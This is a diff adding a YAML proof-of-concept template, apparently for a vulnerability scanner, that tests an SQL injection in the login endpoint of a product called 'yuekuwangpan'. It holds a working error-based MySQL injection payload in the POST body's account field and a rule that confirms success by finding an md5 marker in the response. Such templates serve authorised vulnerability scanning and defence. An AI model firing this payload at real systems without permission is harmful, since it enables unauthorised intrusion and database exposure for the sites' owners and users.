@@ -1,0 +1,21 @@
+name: poc-yaml-yuekuwangpan-html-sql-injection
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /user/login/.html
+      headers:
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+      body: account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,md5(123123)))),0x7e),5597)-- HZLK
+    expression: response.status == 200 && response.body.bcontains(b'4297f44b13955235245b2497399d7a93')
+
+expression: r0()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139705891
